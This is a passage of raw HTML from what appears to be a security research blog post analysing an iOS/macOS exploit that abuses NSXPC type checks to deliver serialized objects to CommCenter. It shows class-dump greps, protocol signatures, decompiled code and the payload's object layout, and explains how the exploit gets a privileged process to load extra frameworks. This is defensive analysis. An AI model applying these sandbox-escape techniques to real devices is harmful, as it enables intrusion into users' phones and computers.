class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1437/image1%286%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1200/image1%286%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750; max-width: 600px;\" title=\"\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c16\"&gt;&lt;span class=\"YDzVciBUld-c13 YDzVciBUld-c3\"&gt;https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;I say NSXPC is only semi-transparent because it does enforce some restrictions on what objects are allowed to traverse process boundaries. Any object &amp;quot;exported&amp;quot; via &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSXPC&lt;/span&gt;&lt;span&gt;&amp;nbsp;must also define a &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;protocol&lt;/span&gt;&lt;span&gt;&amp;nbsp;which designates which methods can be invoked and the allowable types for each argument. The &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW7\"&gt;NSXPC programming guide&lt;/a&gt;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;further explains the extra handling required for methods which require collections and other edge cases.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The low-level serialization used by NSXPC is the same explored by Natalie Silvanovich in her 2019 blog post looking at &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://googleprojectzero.blogspot.com/2019/08/the-fully-remote-attack-surface-of.html\"&gt;the fully-remote attack surface of the iPhone&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. An important observation in that post was that &lt;/span&gt;&lt;span class=\"YDzVciBUld-c14\"&gt;subclasses of classes with any level of inheritance are also allowed, as is always the case with NSKeyedUnarchiver deserialization.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This means that any &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;protocol&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;object which declares a particular type for a field will also, by design, accept any subclass of that type.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;The logical extreme of this would be that a protocol which declared an argument type of NSObject would allow any subclass, which is the vast majority of all Objective-C classes.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.v64ixuc668lc\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;Grep to the rescue&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This is fairly easy to analyze automatically. Protocols are defined statically so we can just find them and check each one. Tools like &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://github.com/nst/RuntimeBrowser/\"&gt;RuntimeBrowser&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"http://stevenygard.com/projects/class-dump/\"&gt;classdump&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;can parse the static protocol definitions and output human-readable source code. Grepping the output of RuntimeBrowser like this is sufficient to find dozens of cases of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;pointers in Objective-C protocols:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; $ egrep -Rn &amp;quot;\\(NSObject \\*\\)arg&amp;quot; *&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Not all the results are necessarily exposed via &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSXPC&lt;/span&gt;&lt;span&gt;, but some clearly are, including the following two matches in &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CoreTelephony.framework&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;Frameworks/CoreTelephony.framework/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;CTXPCServiceSubscriberInterface-Protocol.h:39:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;-(void)evaluateMobileSubscriberIdentity:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (CTXPCServiceSubscriptionContext *)arg1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;identity:(NSObject *)arg2&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;completion:(void (^)(NSError *))arg3;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;Frameworks/CoreTelephony.framework/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;CTXPCServiceCarrierBundleInterface-Protocol.h:13:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;-(void)setWiFiCallingSettingPreferences:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(CTXPCServiceSubscriptionContext *)arg1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key:(NSString *)arg2&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value:(NSObject *)arg3&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;completion:(void (^)(NSError *))arg4;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;evaluateMobileSubscriberIdentity&lt;/span&gt;&lt;span&gt;&amp;nbsp;string appears in the list of selector-like strings we first saw when running strings on the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;bplist00&lt;/span&gt;&lt;span&gt;. Indeed, looking at the parsed and beautified &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;we see it doing this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[ [ [CoreTelephonyClient alloc] init]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; context:X&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; evaluateMobileSubscriberIdentity:Y]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This is a wrapper around the lower-level &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSXPC&lt;/span&gt;&lt;span&gt;&amp;nbsp;code and the argument passed as &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;Y&lt;/span&gt;&lt;span&gt;&amp;nbsp;above to the CoreTelephonyClient method corresponds to the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;identity:(NSObject *)arg2&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument passed via &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSXPC&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;(which is the process that hosts &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;com.apple.commcenter.xpc&lt;/span&gt;&lt;span&gt;, the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSXPC&lt;/span&gt;&lt;span&gt;&amp;nbsp;service underlying the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CoreTelephonyClient&lt;/span&gt;&lt;span&gt;). Since the parameter is explicitly named as &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSObject*&lt;/span&gt;&lt;span&gt;&amp;nbsp;we can in fact pass any subclass of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSObject*&lt;/span&gt;&lt;span&gt;, including an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;! Game over?&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.7ums8k4ivkbp\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;Parsing vs Evaluation&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;It&amp;#39;s not quite that easy. The &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/\"&gt;DezhouInstrumentz writeup&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;discusses this attack surface and notes that there&amp;#39;s an extra, specific mitigation. When an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;is deserialized by its &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;initWithCoder:&lt;/span&gt;&lt;span&gt;&amp;nbsp;implementation it sets a flag which disables evaluation of the predicate until the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;allowEvaluation&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;method is called.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;So whilst you certainly can pass an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate*&lt;/span&gt;&lt;span&gt;&amp;nbsp;as the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;identity&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument across NSXPC and get it deserialized in &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;the implementation of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;evaluateMobileSubscriberIdentity:&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;is definitely not going to call &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;allowEvaluation:&lt;/span&gt;&lt;span&gt;&amp;nbsp; to make the predicate safe for evaluation then &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;evaluateWithObject:&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;and then evaluate it.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.34h1kqwr3d8t\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;Old techniques, new tricks&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;From the exploit we can see that they in fact pass an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSArray&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;with two elements:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[0] = AVSpeechSynthesisVoice&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[1] = PTSection {rows = NSArray { [0] = PTRow() }&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The first element is an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;object and the second is a &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing a single &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRow&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;. Why?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;are both defined in the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PrototypeTools&lt;/span&gt;&lt;span&gt;&amp;nbsp;private framework. &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PrototypeTools&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t loaded in the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;target process. Let&amp;#39;s look at what happens when an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;is deserialized:&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.ihjz2r1jcklz\"&gt;&lt;span&gt;Finding a voice&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;is implemented in &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AVFAudio.framework&lt;/span&gt;&lt;span&gt;, which &lt;/span&gt;&lt;span class=\"YDzVciBUld-c14\"&gt;is&lt;/span&gt;&lt;span&gt;&amp;nbsp;loaded in &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;$ sudo vmmap `pgrep CommCenter` | grep AVFAudio&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;__TEXT &amp;nbsp;7ffa22c4c000-7ffa22d44000 r-x/r-x SM=COW \\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;/System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Assuming that this was the first time that an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;object was created inside CommCenter (which is quite likely) the Objective-C runtime will call the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;initialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;method on the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;class &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/documentation/objectivec/nsobject/1418639-initialize?language=objc\"&gt;before instantiating the first instance&lt;/a&gt;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[AVSpeechSynthesisVoice initialize]&lt;/span&gt;&lt;span&gt;&amp;nbsp;has a &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;dispatch_once&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;block with the following code:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSBundle* bundle;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;bundle = [NSBundle bundleWithPath:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;@&amp;quot;/System/Library/AccessibilityBundles/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;AXSpeechImplementation.bundle&amp;quot;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;if (![bundle isLoaded]) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; NSError err;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; [bundle loadAndReturnError:&amp;amp;err]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;So sending a serialized &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;object will cause &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;to load the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;/System/Library/AccessibilityBundles/AXSpeechImplementation.bundle&lt;/span&gt;&lt;span&gt;&amp;nbsp;library. With some scripting using otool -L to list dependencies we can &amp;nbsp;find the following dependency chain from &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AXSpeechImplementation.bundle&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PrototypeTools.framework&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[&amp;#39;/System/Library/AccessibilityBundles/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; AXSpeechImplementation.bundle/AXSpeechImplementation&amp;#39;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp;&amp;#39;/System/Library/AccessibilityBundles/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; AXSpeechImplementation.bundle/AXSpeechImplementation&amp;#39;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp;&amp;#39;/System/Library/PrivateFrameworks/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; AccessibilityUtilities.framework/AccessibilityUtilities&amp;#39;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp;&amp;#39;/System/Library/PrivateFrameworks/\\&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 